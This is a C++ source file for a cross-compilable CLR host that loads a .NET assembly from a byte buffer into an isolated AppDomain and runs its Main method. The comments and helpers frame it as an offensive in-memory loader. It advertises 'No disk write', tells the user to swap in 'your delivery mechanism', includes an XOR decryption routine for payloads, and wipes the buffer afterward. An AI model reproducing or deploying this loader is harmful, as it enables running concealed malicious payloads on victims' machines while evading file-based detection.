// mingw_loader.cpp — Fully self-contained CLR host for cross-compilation
//
// All COM interfaces are defined inline — no dependency on metahost.h,
// mscorlib.tlb, or any MSVC-specific headers.
//
// Cross-compile from macOS/Linux:
//   x86_64-w64-mingw32-g++ -o loader.exe mingw_loader.cpp -loleaut32 -lole32 -static-libgcc -static-libstdc++
//
// The resulting loader.exe runs on Windows 11 with no dependencies beyond
// what ships with the OS (mscoree.dll is part of .NET Framework).
//
// mscoree.dll is loaded at runtime via LoadLibrary so we don't need the
// import lib (-lmscoree) which MinGW may not have.

#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// MinGW may not define HDOMAINENUM
#ifndef _HDOMAINENUM_DEFINED
typedef void* HDOMAINENUM;
#define _HDOMAINENUM_DEFINED
#endif

// ============================================================================
// COM GUIDs — these are stable, published identifiers from the CLR hosting spec
// ============================================================================

static const GUID CLSID_CLRMetaHost =
    {0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};

static const GUID IID_ICLRMetaHost =
    {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};

static const GUID IID_ICLRRuntimeInfo =
    {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static const GUID CLSID_CorRuntimeHost =
    {0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static const GUID IID_ICorRuntimeHost =
    {0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static const GUID IID_AppDomain =
    {0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};

// ============================================================================
// COM Interface Declarations — manually defined vtable layouts
// These mirror the exact binary layout the CLR expects.
// ============================================================================

#undef INTERFACE

// --- ICLRMetaHost ---
#define INTERFACE ICLRMetaHost
DECLARE_INTERFACE_(ICLRMetaHost, IUnknown)
{
    // IUnknown
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppvObject) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;

    // ICLRMetaHost
    STDMETHOD(GetRuntime)(THIS_ LPCWSTR pwzVersion, REFIID riid, LPVOID* ppRuntime) PURE;
    STDMETHOD(GetVersionFromFile)(THIS_ LPCWSTR pwzFilePath, LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(EnumerateInstalledRuntimes)(THIS_ void** ppEnumerator) PURE;
    STDMETHOD(EnumerateLoadedRuntimes)(THIS_ HANDLE hndProcess, void** ppEnumerator) PURE;
    STDMETHOD(RequestRuntimeLoadedNotification)(THIS_ void* pCallbackFunction) PURE;
    STDMETHOD(QueryLegacyV2RuntimeBinding)(THIS_ REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(ExitProcess)(THIS_ INT32 iExitCode) PURE;
};
#undef INTERFACE

// --- ICLRRuntimeInfo ---
#define INTERFACE ICLRRuntimeInfo
DECLARE_INTERFACE_(ICLRRuntimeInfo, IUnknown)
{
    // IUnknown
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppvObject) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;

    // ICLRRuntimeInfo
    STDMETHOD(GetVersionString)(THIS_ LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(GetRuntimeDirectory)(THIS_ LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(IsLoaded)(THIS_ HANDLE hndProcess, BOOL* pbLoaded) PURE;
    STDMETHOD(LoadErrorString)(THIS_ UINT iResourceID, LPWSTR pwzBuffer, DWORD* pcchBuffer, LONG iLocaleID) PURE;
    STDMETHOD(LoadLibrary)(THIS_ LPCWSTR pwzDllName, HMODULE* phndModule) PURE;
    STDMETHOD(GetProcAddress)(THIS_ LPCSTR pszProcName, LPVOID* ppProc) PURE;
    STDMETHOD(GetInterface)(THIS_ REFCLSID rclsid, REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(IsLoadable)(THIS_ BOOL* pbLoadable) PURE;
    STDMETHOD(SetDefaultStartupFlags)(THIS_ DWORD dwStartupFlags, LPCWSTR pwzHostConfigFile) PURE;
    STDMETHOD(GetDefaultStartupFlags)(THIS_ DWORD* pdwStartupFlags, LPWSTR pwzHostConfigFile, DWORD* pcchHostConfigFile) PURE;
    STDMETHOD(BindAsLegacyV2Runtime)(THIS) PURE;
    STDMETHOD(IsStarted)(THIS_ BOOL* pbStarted, DWORD* pdwStartupFlags) PURE;
};
#undef INTERFACE

// --- ICorRuntimeHost ---
#define INTERFACE ICorRuntimeHost
DECLARE_INTERFACE_(ICorRuntimeHost, IUnknown)
{
    // IUnknown
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppvObject) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;

    // ICorRuntimeHost
    STDMETHOD(CreateLogicalThreadState)(THIS) PURE;
    STDMETHOD(DeleteLogicalThreadState)(THIS) PURE;
    STDMETHOD(SwitchInLogicalThreadState)(THIS_ DWORD* pFiberCookie) PURE;
    STDMETHOD(SwitchOutLogicalThreadState)(THIS_ DWORD** pFiberCookie) PURE;
    STDMETHOD(LocksHeldByLogicalThread)(THIS_ DWORD* pCount) PURE;
    STDMETHOD(MapFile)(THIS_ HANDLE hFile, HMODULE* hMapAddress) PURE;
    STDMETHOD(GetConfiguration)(THIS_ void** pConfiguration) PURE;
    STDMETHOD(Start)(THIS) PURE;
    STDMETHOD(Stop)(THIS) PURE;
    STDMETHOD(CreateDomain)(THIS_ LPCWSTR pwzFriendlyName, IUnknown* pIdentityArray, IUnknown** pAppDomain) PURE;
    STDMETHOD(GetDefaultDomain)(THIS_ IUnknown** pAppDomain) PURE;
    STDMETHOD(EnumDomains)(THIS_ HDOMAINENUM* hEnum) PURE;
    STDMETHOD(NextDomain)(THIS_ HDOMAINENUM hEnum, IUnknown** pAppDomain) PURE;
    STDMETHOD(CloseEnum)(THIS_ HDOMAINENUM hEnum) PURE;
    STDMETHOD(CreateDomainEx)(THIS_ LPCWSTR pwzFriendlyName, IUnknown* pSetup, IUnknown* pEvidence, IUnknown** pAppDomain) PURE;
    STDMETHOD(CreateDomainSetup)(THIS_ IUnknown** pAppDomainSetup) PURE;
    STDMETHOD(CreateEvidence)(THIS_ IUnknown** pEvidence) PURE;
    STDMETHOD(UnloadDomain)(THIS_ IUnknown* pAppDomain) PURE;
    STDMETHOD(CurrentDomain)(THIS_ IUnknown** pAppDomain) PURE;
};
#undef INTERFACE

// ============================================================================
// CLRCreateInstance — loaded dynamically from mscoree.dll so we avoid needing
// a MinGW import library for mscoree
// ============================================================================

typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

static pfnCLRCreateInstance GetCLRCreateInstance() {
    HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
    if (!hMscoree) {
        fprintf(stderr, "[-] mscoree.dll not found — .NET Framework not installed?\n");
        return NULL;
    }
    pfnCLRCreateInstance fn = (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fn) {
        fprintf(stderr, "[-] CLRCreateInstance not found in mscoree.dll\n");
    }
    return fn;
}

// ============================================================================
// IDispatch helper — invoke a method or property by name on a COM object
// ============================================================================

static HRESULT DispatchCall(
    IDispatch* pDisp,
    LPCOLESTR name,
    WORD flags,        // DISPATCH_METHOD, DISPATCH_PROPERTYGET, etc.
    DISPPARAMS* pParams,
    VARIANT* pResult
) {
    DISPID dispid;
    OLECHAR* names[] = { (OLECHAR*)name };
    HRESULT hr = pDisp->GetIDsOfNames(IID_NULL, names, 1, LOCALE_SYSTEM_DEFAULT, &dispid);
    if (FAILED(hr)) return hr;
    return pDisp->Invoke(dispid, IID_NULL, LOCALE_SYSTEM_DEFAULT, flags, pParams, pResult, NULL, NULL);
}

// ============================================================================
// XOR decrypt in-place
// ============================================================================

static void XorDecrypt(unsigned char* data, unsigned int len, const unsigned char* key, unsigned int keyLen) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

// ============================================================================
// Core: load CLR, create isolated AppDomain, execute assembly from byte array
// ============================================================================

static int ExecuteAssembly(
    unsigned char* assemblyBytes,
    unsigned int assemblyLen,
    int argc,
    wchar_t** argv
) {
    HRESULT hr;
    int result = 1;

    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pDomainThunk = NULL;
    IDispatch* pDomainDisp = NULL;
    BOOL clrStarted = FALSE;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // Dynamically resolve CLRCreateInstance
    pfnCLRCreateInstance fnCreate = GetCLRCreateInstance();
    if (!fnCreate) goto cleanup;

    // 1. MetaHost
    hr = fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CLRCreateInstance: 0x%08lx\n", hr);
        goto cleanup;
    }

    // 2. Runtime info for .NET 4.x
    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] GetRuntime: 0x%08lx\n", hr);
        goto cleanup;
    }

    // 3. Check loadable
    {
        BOOL loadable = FALSE;
        hr = pRuntimeInfo->IsLoadable(&loadable);
        if (FAILED(hr) || !loadable) {
            fprintf(stderr, "[-] CLR not loadable\n");
            goto cleanup;
        }
    }

    // 4. Get ICorRuntimeHost
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] GetInterface: 0x%08lx\n", hr);
        goto cleanup;
    }

    // 5. Start CLR
    hr = pRuntimeHost->Start();
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CLR Start: 0x%08lx\n", hr);
        goto cleanup;
    }
    clrStarted = TRUE;

    // 6. Create isolated AppDomain
    hr = pRuntimeHost->CreateDomain(L"Loader", NULL, &pDomainThunk);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CreateDomain: 0x%08lx\n", hr);
        goto cleanup;
    }

    // 7. Get IDispatch on the AppDomain (avoids TLB dependency entirely)
    hr = pDomainThunk->QueryInterface(IID_IDispatch, (void**)&pDomainDisp);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] QI(IDispatch) on AppDomain: 0x%08lx\n", hr);
        goto cleanup;
    }

    // 8. Call AppDomain.Load(byte[])
    {
        // Build SAFEARRAY of bytes
        SAFEARRAYBOUND bounds = { assemblyLen, 0 };
        SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
        if (!psa) {
            fprintf(stderr, "[-] SafeArrayCreate failed\n");
            goto cleanup;
        }
        void* pvData = NULL;
        SafeArrayAccessData(psa, &pvData);
        memcpy(pvData, assemblyBytes, assemblyLen);
        SafeArrayUnaccessData(psa);

        VARIANT vtAssemblyArg;
        VariantInit(&vtAssemblyArg);
        vtAssemblyArg.vt = VT_ARRAY | VT_UI1;
        vtAssemblyArg.parray = psa;

        DISPPARAMS loadParams = { &vtAssemblyArg, NULL, 1, 0 };
        VARIANT vtAssembly;
        VariantInit(&vtAssembly);

        hr = DispatchCall(pDomainDisp, L"Load", DISPATCH_METHOD, &loadParams, &vtAssembly);
        SafeArrayDestroy(psa);

        if (FAILED(hr)) {
            fprintf(stderr, "[-] AppDomain.Load(byte[]): 0x%08lx\n", hr);
            goto cleanup;
        }

        // 9. Get Assembly.EntryPoint
        IDispatch* pAssemblyDisp = vtAssembly.pdispVal;
        DISPPARAMS noParams = { NULL, NULL, 0, 0 };
        VARIANT vtEntryPoint;
        VariantInit(&vtEntryPoint);

        hr = DispatchCall(pAssemblyDisp, L"EntryPoint", DISPATCH_PROPERTYGET, &noParams, &vtEntryPoint);
        if (FAILED(hr) || !vtEntryPoint.pdispVal) {
            fprintf(stderr, "[-] Assembly.EntryPoint: 0x%08lx\n", hr);
            pAssemblyDisp->Release();
            goto cleanup;
        }

        // 10. Build string[] args for Main()
        IDispatch* pMethodInfo = vtEntryPoint.pdispVal;

        VARIANT vtManagedArgs;
        VariantInit(&vtManagedArgs);

        if (argc > 0 && argv != NULL) {
            SAFEARRAYBOUND argBounds = { (ULONG)argc, 0 };
            SAFEARRAY* psaStrArgs = SafeArrayCreate(VT_BSTR, 1, &argBounds);
            for (int i = 0; i < argc; i++) {
                long idx = i;
                BSTR bstr = SysAllocString(argv[i]);
                SafeArrayPutElement(psaStrArgs, &idx, bstr);
                SysFreeString(bstr);
            }
            vtManagedArgs.vt = VT_ARRAY | VT_BSTR;
            vtManagedArgs.parray = psaStrArgs;
        }

        // 11. Wrap in object[] for MethodInfo.Invoke(null, object[]{string[]})
        SAFEARRAYBOUND paramBounds = { 1, 0 };
        SAFEARRAY* psaInvokeParams = SafeArrayCreate(VT_VARIANT, 1, &paramBounds);
        {
            long idx = 0;
            SafeArrayPutElement(psaInvokeParams, &idx, &vtManagedArgs);
        }

        // 12. Call MethodInfo.Invoke(null, params)
        //     IDispatch args are in reverse order: [0]=last param, [1]=first param
        VARIANT invokeArgs[2];
        VariantInit(&invokeArgs[0]);
        invokeArgs[0].vt = VT_ARRAY | VT_VARIANT;
        invokeArgs[0].parray = psaInvokeParams;
        VariantInit(&invokeArgs[1]); // null for 'this' (static method)

        DISPPARAMS invokeParams = { invokeArgs, NULL, 2, 0 };
        VARIANT vtResult;
        VariantInit(&vtResult);

        hr = DispatchCall(pMethodInfo, L"Invoke", DISPATCH_METHOD, &invokeParams, &vtResult);

        if (FAILED(hr)) {
            fprintf(stderr, "[-] MethodInfo.Invoke: 0x%08lx\n", hr);
        } else {
            result = 0;
        }

        // Cleanup
        VariantClear(&vtResult);
        SafeArrayDestroy(psaInvokeParams);
        if (vtManagedArgs.vt != VT_EMPTY) VariantClear(&vtManagedArgs);
        pMethodInfo->Release();
        pAssemblyDisp->Release();
    }

cleanup:
    if (pDomainDisp) pDomainDisp->Release();
    if (pDomainThunk && pRuntimeHost) pRuntimeHost->UnloadDomain(pDomainThunk);
    if (pDomainThunk) pDomainThunk->Release();
    if (pRuntimeHost) {
        if (clrStarted) pRuntimeHost->Stop();
        pRuntimeHost->Release();
    }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();

    CoUninitialize();
    return result;
}

// ============================================================================
// Entry point — replace the file read with your delivery mechanism
// ============================================================================

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: %ls <assembly> [args...]\n", argv[0]);
        wprintf(L"Reads assembly into memory, executes via CLR hosting. No disk write.\n");
        return 1;
    }

    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fwprintf(stderr, L"[-] Cannot open: %ls\n", argv[1]);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char* buf = (unsigned char*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        fprintf(stderr, "[-] VirtualAlloc failed\n");
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    wprintf(L"[*] %lu bytes loaded\n", fileSize);

    int managedArgc = argc - 2;
    wchar_t** managedArgv = (argc > 2) ? &argv[2] : NULL;

    int ret = ExecuteAssembly(buf, fileSize, managedArgc, managedArgv);

    SecureZeroMemory(buf, fileSize);
    VirtualFree(buf, 0, MEM_RELEASE);

    return ret;
}
